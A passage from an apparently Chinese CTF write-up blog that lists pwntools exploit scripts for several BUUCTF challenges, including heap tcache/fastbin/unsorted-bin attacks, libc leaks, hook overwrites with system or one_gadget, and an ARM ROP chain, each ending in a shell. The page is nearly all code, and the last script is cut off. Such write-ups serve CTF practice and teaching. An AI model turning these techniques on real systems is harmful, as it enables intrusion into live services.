class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn1")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size):</span><br><span class="line">sh.recvuntil("6.exit")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("Input the size")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">def free():</span><br><span class="line">sh.recvuntil("6.exit")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">def show():</span><br><span class="line">sh.recvuntil("6.exit")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">def edit(content):</span><br><span class="line">sh.recvuntil("6.exit")</span><br><span class="line">sh.sendline("5")</span><br><span class="line">sh.recvuntil("Input the note")</span><br><span class="line">sh.send(content)</span><br><span class="line">def editName(name):</span><br><span class="line">sh.recvuntil("6.exit")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.recvuntil("Please input your name")</span><br><span class="line">sh.send(name)</span><br><span class="line">def init(name):</span><br><span class="line">sh.recvuntil("Please input your name")</span><br><span class="line">sh.send(name)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./pwn1")</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">init("a"*0x30)</span><br><span class="line">add(0x80)</span><br><span class="line">add(0x18)</span><br><span class="line">editName("a"*0x30 + "\x10")</span><br><span class="line">free()</span><br><span class="line">add(0x18)</span><br><span class="line">editName("a"*0x30 + "\x30")</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil("\n")</span><br><span class="line">main_arena = u64(sh.recvuntil("\n",True).ljust(8,"\x00")) - 88 </span><br><span class="line">libc = main_arena - 0x10 - lib.symbols['__malloc_hook']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">unsorted_bin_attack_addr = libc + 0x3C6768</span><br><span class="line">fastbin_attack_addr = unsorted_bin_attack_addr + 0x18 - 0x1b + 0x10</span><br><span class="line">add(0x10)</span><br><span class="line">free()</span><br><span class="line">add(0x68)</span><br><span class="line">free()</span><br><span class="line">add(0x30)</span><br><span class="line">free()</span><br><span class="line">add(0x90)</span><br><span class="line">add(0x20)</span><br><span class="line">editName("a" * 0x30 + "\x30")</span><br><span class="line">free()</span><br><span class="line">add(0x50)</span><br><span class="line">editName("a" * 0x30 + "\x90")</span><br><span class="line">edit('a' * 8 + p64(unsorted_bin_attack_addr))</span><br><span class="line">add(0x30)</span><br><span class="line">add(0x68)</span><br><span class="line">add(0x10)</span><br><span class="line">editName("a" * 0x30 + "\xc0")</span><br><span class="line">free()</span><br><span class="line">add(0x40)</span><br><span class="line">editName("a" * 0x30 + "\xc0")</span><br><span class="line">edit(p64(fastbin_attack_addr))</span><br><span class="line">add(0x68)</span><br><span class="line">add(0x68)</span><br><span class="line">payload = "sh\x00"</span><br><span class="line">payload = payload.ljust(0x30 - 5 - 8,"\x00")</span><br><span class="line">edit(payload + p64(system))</span><br><span class="line">free()</span><br><span class="line">log.success("fastbin_attack_addr: " + hex(fastbin_attack_addr))</span><br><span class="line">log.success("unsorted_bin_attack_addr: " + hex(unsorted_bin_attack_addr))</span><br><span class="line">log.success("main_arena: " + hex(main_arena))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node2.buuoj.cn.wetolink.com",28672,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x60-ciscn-2019-sw-5"><a href="#0x60-ciscn-2019-sw-5" class="headerlink" title="0x60 ciscn_2019_sw_5"></a>0x60 ciscn_2019_sw_5</h2><h3 id="Ubuntu-18-04"><a href="#Ubuntu-18-04" class="headerlink" title="Ubuntu 18.04"></a>Ubuntu 18.04</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_sw_5")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(title,content):</span><br><span class="line">sh.recvuntil(">> ")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("title:")</span><br><span class="line">sh.send(title)</span><br><span class="line">sh.recvuntil("content:")</span><br><span class="line">sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">sh.recvuntil(">> ")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_sw_5")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/libc-2.27.so")</span><br><span class="line">chunk_offset = 0x202040</span><br><span class="line">add('\x11' * 8,'\x12' * 0x68)</span><br><span class="line">add('\x21' * 8,'\x22' * 0x68)</span><br><span class="line">free(0)</span><br><span class="line">free(0)</span><br><span class="line">add('\x80','\n')</span><br><span class="line">heap_base = u64(sh.recvuntil("\x20\n",True)[-6:].ljust(8,"\x00")) - 0x280</span><br><span class="line">add(p64(heap_base + 0x20),p64(heap_base + 0x20) * 5)</span><br><span class="line">add(p64(heap_base + 0x20),p64(heap_base + 0x20) * 5)</span><br><span class="line">payload  = ('\xf9' * 0x8) * 6</span><br><span class="line">payload += p64(0x250 - 0x50 + 1) + p64(0) * 4 + p64(heap_base + 0x60)</span><br><span class="line">add('\xaa' * 0x8,payload)</span><br><span class="line">payload = p64(0) * 3 + p64(heap_base + 0x60)</span><br><span class="line">add(p64(0),payload)</span><br><span class="line">free(6)</span><br><span class="line">payload = p64(0) * 3 + p64(heap_base + 0x60)</span><br><span class="line">add('\n',payload)</span><br><span class="line">libc = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00')) + 0x30 - lib.symbols['__malloc_hook'] - 0xa</span><br><span class="line">__malloc_hook = libc + lib.symbols['__malloc_hook']</span><br><span class="line">payload = p64(0) * 3 + p64(__malloc_hook)</span><br><span class="line">add(p64(0),payload)</span><br><span class="line">one_gadget = [0x4f2c5,0x4f322,0x10a38c]</span><br><span class="line">add(p64(libc + one_gadget[1]),'\n')</span><br><span class="line">sh.recvuntil(">> ")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("__malloc_hook: " + hex(__malloc_hook))</span><br><span class="line">log.success("heap_base: " + hex(heap_base))</span><br><span class="line">if debug == 1:</span><br><span class="line">log.success("pid = " + str(sh.pid))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node2.buuoj.cn.wetolink.com",28938,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x61-ciscn-nw-2"><a href="#0x61-ciscn-nw-2" class="headerlink" title="0x61 ciscn_nw_2"></a>0x61 ciscn_nw_2</h2><h3 id="Ubuntu-18-04-1"><a href="#Ubuntu-18-04-1" class="headerlink" title="Ubuntu 18.04"></a>Ubuntu 18.04</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_nw_2")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(title,content):</span><br><span class="line">sh.recvuntil(">> ")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("title:")</span><br><span class="line">sh.send(title)</span><br><span class="line">sh.recvuntil("content:")</span><br><span class="line">sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">sh.recvuntil(">> ")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_nw_2")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/libc-2.27.so")</span><br><span class="line">chunk_offset = 0x202040</span><br><span class="line">add('\x11' * 8,'\x12' * 0x68)</span><br><span class="line">add('\x21' * 8,'\x22' * 0x68)</span><br><span class="line">free(0)</span><br><span class="line">free(0)</span><br><span class="line">add('\x80','\n')</span><br><span class="line">heap_base = u64(sh.recvuntil("\x20\n",True)[-6:].ljust(8,"\x00")) - 0x280</span><br><span class="line">add(p64(heap_base + 0x20),p64(heap_base + 0x20) * 5)</span><br><span class="line">add(p64(heap_base + 0x20),p64(heap_base + 0x20) * 5)</span><br><span class="line">payload  = ('\xf9' * 0x8) * 6</span><br><span class="line">payload += p64(0x250 - 0x50 + 1) + p64(0) * 4 + p64(heap_base + 0x60)</span><br><span class="line">add('\xaa' * 0x8,payload)</span><br><span class="line">payload = p64(0) * 3 + p64(heap_base + 0x60)</span><br><span class="line">add(p64(0),payload)</span><br><span class="line">free(6)</span><br><span class="line">payload = p64(0) * 3 + p64(heap_base + 0x60)</span><br><span class="line">add('\n',payload)</span><br><span class="line">libc = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00')) + 0x30 - lib.symbols['__malloc_hook'] - 0xa</span><br><span class="line">__malloc_hook = libc + lib.symbols['__malloc_hook']</span><br><span class="line">payload = p64(0) * 3 + p64(__malloc_hook)</span><br><span class="line">add(p64(0),payload)</span><br><span class="line">one_gadget = [0x4f2c5,0x4f322,0x10a38c]</span><br><span class="line">add(p64(libc + one_gadget[1]),'\n')</span><br><span class="line">sh.recvuntil(">> ")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("__malloc_hook: " + hex(__malloc_hook))</span><br><span class="line">log.success("heap_base: " + hex(heap_base))</span><br><span class="line">if debug == 1:</span><br><span class="line">log.success("pid = " + str(sh.pid))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node2.buuoj.cn.wetolink.com",28979,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x62-ciscn-2019-en-1"><a href="#0x62-ciscn-2019-en-1" class="headerlink" title="0x62 ciscn_2019_en_1"></a>0x62 ciscn_2019_en_1</h2><h3 id="标准的arm-pwn-rop，很适合新手"><a href="#标准的arm-pwn-rop，很适合新手" class="headerlink" title="标准的arm pwn rop，很适合新手"></a>标准的arm pwn rop，很适合新手</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.binary = "ciscn_2019_en_1"</span><br><span class="line">elf = ELF("ciscn_2019_en_1")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_en_1")</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">pop_r3_pc = 0x000103a4</span><br><span class="line">pop_r4_pc = 0x000104f8</span><br><span class="line">pop_r4_2_r10_pc_ret = 0x00010638</span><br><span class="line">printf_got = 0x00021010</span><br><span class="line">offset = 36</span><br><span class="line">fmt = 0x00010660</span><br><span class="line">call_gadget = 0x0001061C</span><br><span class="line">payload = offset * 'a'</span><br><span class="line">payload += p32(pop_r4_2_r10_pc_ret)</span><br><span class="line">payload += p32(0)#r4</span><br><span class="line">payload += p32(printf_got)#r5</span><br><span class="line">payload += p32(0)#r6</span><br><span class="line">payload += p32(fmt)#r7</span><br><span class="line">payload += p32(printf_got)#r8</span><br><span class="line">payload += p32(0)#r9</span><br><span class="line">payload += p32(0)#r10</span><br><span class="line">payload += p32(call_gadget)</span><br><span class="line">payload += p32(0x00010590)*10</span><br><span class="line">sh.sendafter(":",payload)</span><br><span class="line">sh.recvuntil("hello")</span><br><span class="line">sh.recvuntil("hello ")</span><br><span class="line">printf = u32(sh.recv(4))</span><br><span class="line">libc_r0_ret = 0x0010dc84</span><br><span class="line">libc = printf - lib.symbols['printf']</span><br><span class="line">system = libc +lib.symbols['system']</span><br><span class="line">binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">payload = offset * 'a'</span><br><span class="line">payload += p32(libc + libc_r0_ret) + p32(binsh) + p32(system)</span><br><span class="line">sh.sendafter(":",payload)</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node2.buuoj.cn.wetolink.com",28562,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x63-ciscn-2019-n-2"><a href="#0x63-ciscn-2019-n-2" class="headerlink" title="0x63 ciscn_2019_n_2"></a>0x63 ciscn_2019_n_2</h2><h3 id="Ubuntu-18-04-2"><a href="#Ubuntu-18-04-2" class="headerlink" title="Ubuntu 18.04"></a>Ubuntu 18.04</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_n_2")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def addUser(name,age):</span><br><span class="line">sh.recvuntil("Your choice: ")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("name:")</span><br><span class="line">sh.send(name)</span><br><span class="line">sh.recvuntil("age:")</span><br><span class="line">sh.send(str(age))</span><br><span class="line">sh.recvuntil("idx: ")</span><br><span class="line">return int(sh.recv(1),10)</span><br><span class="line">def deleteUser(idx):</span><br><span class="line">sh.recvuntil("Your choice: ")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("Index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def editUser(idx,name,age):</span><br><span class="line">sh.recvuntil("Your choice: ")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.recvuntil("Index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil("name:")</span><br><span class="line">sh.send(name)</span><br><span class="line">sh.recvuntil("age:")</span><br><span class="line">sh.send(str(age))</span><br><span class="line">def addMoney(idx):</span><br><span class="line">sh.recvuntil("Your choice: ")</span><br><span class="line">sh.sendline("5")</span><br><span class="line">sh.recvuntil("Index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def buyGift(idx,addr,size):</span><br><span class="line">sh.recvuntil("Your choice: ")</span><br><span class="line">sh.sendline("6")</span><br><span class="line">sh.recvuntil("Index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil("input the address you want to leak:")</span><br><span class="line">sh.sendline(hex(addr))</span><br><span class="line">sh.recvuntil("input the size you want to leak:")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">def showUser(idx):</span><br><span class="line">sh.recvuntil("Your choice: ")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.recvuntil("Index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_n_2")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">chunk_list = 0x602060</span><br><span class="line">heap_base = 0x603000</span><br><span class="line">addUser('\x11' * 8,0x10)</span><br><span class="line">deleteUser(0)</span><br><span class="line">deleteUser(0)</span><br><span class="line">addUser(p64(chunk_list),heap_base)</span><br><span class="line">addUser(p64(chunk_list),heap_base)</span><br><span class="line">addUser(p64(0x602070 + 8),0x603250)</span><br><span class="line">buyGift(0,elf.got['__libc_start_main'],8)</span><br><span class="line">__libc_start_main = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc +lib.symbols['system']</span><br><span class="line">binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line">editUser(2,p64(binsh),__free_hook)</span><br><span class="line">editUser(1,p64(system),1)</span><br><span class="line">deleteUser(0)</span><br><span class="line">log.success("heap_base: " + hex(heap_base))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">log.success("__malloc_hook: " + hex(__malloc_hook))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node2.buuoj.cn.wetolink.com",28334,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x64-TWCTF-online-2019-asterisk-alloc"><a href="#0x64-TWCTF-online-2019-asterisk-alloc" class="headerlink" title="0x64 TWCTF_online_2019_asterisk_alloc"></a>0x64 TWCTF_online_2019_asterisk_alloc</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.binary = "TWCTF_online_2019_asterisk_alloc"</span><br><span class="line">elf = ELF("TWCTF_online_2019_asterisk_alloc")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def malloc(size,content):</span><br><span class="line">    sh.sendlineafter("Your choice: ","1")</span><br><span class="line">    sh.sendlineafter("Size:",str(size))</span><br><span class="line">    sh.sendafter("Data:",content)</span><br><span class="line">def calloc(size,content):</span><br><span class="line">    sh.sendlineafter("Your choice: ","2")</span><br><span class="line">    sh.sendlineafter("Size:",str(size))</span><br><span class="line">    sh.sendafter("Data:",content)</span><br><span class="line">def realloc(size,content):</span><br><span class="line">    sh.sendlineafter("Your choice: ","3")</span><br><span class="line">    sh.sendlineafter("Size:",str(size))</span><br><span class="line">    sh.sendafter("Data:",content)</span><br><span class="line">def free(index):</span><br><span class="line">    sh.sendlineafter("Your choice:","4")</span><br><span class="line">    sh.sendlineafter("Which: ",str(index))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./TWCTF_online_2019_asterisk_alloc")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/libc-2.27.so")</span><br><span class="line">    realloc(0x88,'\n')</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x68,'\n')</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x88,'aaaaaaa')</span><br><span class="line">    offset = lib.symbols['_IO_2_1_stdout_'] % 0x10000</span><br><span class="line">    for i in range(7):</span><br><span class="line">        free("r")</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x58,p16(offset))</span><br><span class="line">    calloc(0x28,'/bin/sh\x00')</span><br><span class="line">    malloc(0x88,p16(offset))</span><br><span class="line">    